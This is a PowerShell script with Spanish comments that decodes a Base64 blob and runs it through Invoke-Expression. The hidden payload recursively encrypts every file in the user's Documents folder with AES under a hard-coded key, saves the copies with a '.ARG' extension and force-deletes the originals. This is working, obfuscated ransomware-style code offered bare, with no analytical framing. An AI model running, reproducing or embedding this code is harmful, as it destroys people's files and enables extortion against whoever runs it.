$Base64String="JGZvbGRlclBhdGggPSBKb2luLVBhdGggJGVudjpVU0VSUFJPRklMRSAiRG9jdW1lbnRzIg0KDQokQ2xhdmU9IkhvbGFNdW5kbyINCg0KIyBWZXJpZmljYXIgc2kgbGEgY2FycGV0YSBleGlzdGUNCmlmICgtTm90IChUZXN0LVBhdGggLVBhdGggJGZvbGRlclBhdGgpKSB7DQogICAgV3JpdGUtSG9zdCAiTGEgY2FycGV0YSBlc3BlY2lmaWNhZGEgbm8gZXhpc3RlLiINCiAgICBleGl0DQp9DQoNCiMgQ29udmllcnRlIGxhIGNsYXZlIGVuIGJ5dGVzIHkgZ2VuZXJhIHVuYSBjbGF2ZSBkZSAyNTYgYml0cyAoMzIgYnl0ZXMpDQokY2xhdmVCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJENsYXZlKQ0KaWYgKCRjbGF2ZUJ5dGVzLkxlbmd0aCAtbHQgMzIpIHsNCiAgICAkY2xhdmVCeXRlcyA9ICRjbGF2ZUJ5dGVzICsgKDAuLigzMSAtICRjbGF2ZUJ5dGVzLkxlbmd0aCkgfCBGb3JFYWNoLU9iamVjdCB7IDAgfSkNCn0gZWxzZWlmICgkY2xhdmVCeXRlcy5MZW5ndGggLWd0IDMyKSB7DQogICAgJGNsYXZlQnl0ZXMgPSAkY2xhdmVCeXRlc1swLi4zMV0NCn0NCg0KIyBHZW5lcmEgdW4gSVYgYWxlYXRvcmlvIGRlIDE2IGJ5dGVzDQokaXYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNg0KW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmFuZG9tTnVtYmVyR2VuZXJhdG9yXTo6Q3JlYXRlKCkuR2V0Qnl0ZXMoJGl2KQ0KDQojIEVudW1lcmFyIHRvZG9zIGxvcyBhcmNoaXZvcyBlbiBsYSBjYXJwZXRhIHkgc3ViY2FycGV0YXMNCiRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlclBhdGggLVJlY3Vyc2UgLUZpbGUNCg0KIyBHZW5lcmFyIGxhIGxpc3RhIGRlIHJ1dGFzIGNvbXBsZXRhcw0KZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7DQoNCiRBcmNoaXZvPSRmaWxlLkZ1bGxOYW1lDQoNCiMgQ3JlYSBlbCBvYmpldG8gQUVTDQokYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkNCiRhZXMuS2V5U2l6ZSA9IDI1Ng0KJGFlcy5CbG9ja1NpemUgPSAxMjgNCiRhZXMuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkMNCiRhZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcNCiRhZXMuS2V5ID0gJGNsYXZlQnl0ZXMNCiRhZXMuSVYgPSAkaXYNCg0KIyBMZWUgZWwgY29udGVuaWRvIGRlbCBhcmNoaXZvIG9yaWdpbmFsDQokY29udGVuaWRvID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRBcmNoaXZvKQ0KDQojIENpZnJhIGVsIGNvbnRlbmlkbw0KJGVuY3J5cHRvciA9ICRhZXMuQ3JlYXRlRW5jcnlwdG9yKCkNCiRjb250ZW5pZG9DaWZyYWRvID0gJGVuY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRjb250ZW5pZG8sIDAsICRjb250ZW5pZG8uTGVuZ3RoKQ0KDQojIENvbWJpbmEgZWwgSVYgeSBlbCBjb250ZW5pZG8gY2lmcmFkbw0KJHNhbGlkYSA9IE5ldy1PYmplY3QgYnl0ZVtdICgkaXYuTGVuZ3RoICsgJGNvbnRlbmlkb0NpZnJhZG8uTGVuZ3RoKQ0KW0FycmF5XTo6Q29weSgkaXYsIDAsICRzYWxpZGEsIDAsICRpdi5MZW5ndGgpDQpbQXJyYXldOjpDb3B5KCRjb250ZW5pZG9DaWZyYWRvLCAwLCAkc2FsaWRhLCAkaXYuTGVuZ3RoLCAkY29udGVuaWRvQ2lmcmFkby5MZW5ndGgpDQoNCiMgR3VhcmRhIGVsIGFyY2hpdm8gY2lmcmFkbyBjb24gbGEgZXh0ZW5zacOzbiAuQVJHDQokcnV0YVNhbGlkYSA9ICIkQXJjaGl2by5BUkciDQpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRydXRhU2FsaWRhLCAkc2FsaWRhKQ0KDQpSZW1vdmUtSXRlbSAtUGF0aCAkQXJjaGl2byAtRm9yY2UNCg0KV3JpdGUtT3V0cHV0ICJBcmNoaXZvIGNpZnJhZG8gZ3VhcmRhZG8gY29tbzogJHJ1dGFTYWxpZGEiDQp9"

try {
    # Decodificar la cadena Base64
    $decodedBytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

    Invoke-Expression $decodedString
}
catch {
    Write-Error "Error al decodificar o ejecutar la cadena: $_"
}
